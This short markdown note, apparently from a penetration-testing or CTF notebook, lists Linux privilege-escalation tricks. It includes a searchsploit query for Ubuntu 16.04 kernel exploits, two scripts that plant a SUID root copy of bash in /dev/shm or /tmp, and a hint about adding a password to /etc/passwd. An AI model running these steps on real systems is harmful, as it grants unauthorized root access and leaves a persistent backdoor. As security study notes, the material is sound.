# Tricks

```bash
# Given we know we are running 16.04.3 LTS (kernel 4.4.0-116-generic)
searchsploit "Linux Kernel Ubuntu 16.04 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0"
```

Checking `syslog` is particularly useful when exploits dont work as intended

Living in `/dev/shm/` (`/dev/shm` is RAM)

```bash
#!/bin/bash
cp /bin/bash /dev/shm/bash
chown root:root /dev/shm/bash
chmod u+s /dev/shm/bash
```

Living in `/tmp/`

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod u+s /tmp/bash
```

Generate a password for `/etc/passwd` with [openssl](../Tools/Encryption/openssl.md)
